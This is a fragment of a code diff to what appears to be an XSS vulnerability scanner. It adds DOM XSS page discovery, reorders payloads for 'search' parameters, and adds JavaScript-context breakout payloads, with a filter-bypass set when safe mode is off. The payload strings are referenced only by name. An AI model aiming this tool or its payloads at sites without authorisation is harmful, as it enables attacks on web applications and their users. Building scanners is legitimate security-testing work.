+        for cand in _discover_dom_xss_candidate_pages(url, timeout=timeout, headers=headers, max_urls=3):
+            if cand not in dom_targets:
+                dom_targets.append(cand)
+
+        for dom_url in dom_targets[:4]:
+            dom_vulns = test_dom_xss(dom_url, timeout=timeout, browser_verify=browser_verify)
+            if dom_vulns:
+                vulnerabilities.extend(dom_vulns)
+
+            # Avoid spamming the report: once we get a concrete DOM XSS PoC, stop trying more pages.
+            if any(v.get("type") == "dom_xss" for v in (dom_vulns or [])):
+                break
     except Exception as e:
         log(f"DOM XSS check failed: {str(e)}", 'WARN')
 
@@ -1418,7 +2014,13 @@ def _prioritize_payloads_for_param(param_name: str, payloads: List[str]) -> List
     """
     if param_name.lower() != 'search':
         return payloads
-    ordered = [SEARCH_PRIORITY_PAYLOAD, SEARCH_ATTRIBUTE_PRIORITY_PAYLOAD]
+    ordered = [
+        SEARCH_SVG_ANIMATION_PRIORITY_PAYLOAD,
+        SEARCH_PRIORITY_PAYLOAD,
+        SEARCH_ATTRIBUTE_PRIORITY_PAYLOAD,
+        JSON_EVAL_BACKSLASH_BREAKOUT_PAYLOAD,
+        JS_STRING_BREAKOUT_PAYLOAD,
+    ]
     for payload in payloads:
         if payload not in ordered:
             ordered.append(payload)
@@ -1438,6 +2040,16 @@ def _adaptive_candidate_payloads(context: str, safe_mode: bool = True) -> List[s
         if not safe_mode:
             candidates.extend(XSSPayloads.FILTER_BYPASS)
         # Deduplicate while preserving order
+        seen = set()
+        ordered = []
+        for p in candidates:
+            if p not in seen:
+                seen.add(p)
+                ordered.append(p)
+        return ordered
+    if context == 'javascript':
+        candidates = [JSON_EVAL_BACKSLASH_BREAKOUT_PAYLOAD, JS_STRING_BREAKOUT_PAYLOAD]
+        candidates.extend(XSSPayloads.JAVASCRIPT_CONTEXT)
         seen = set()
         ordered = []
         for p in candidates:
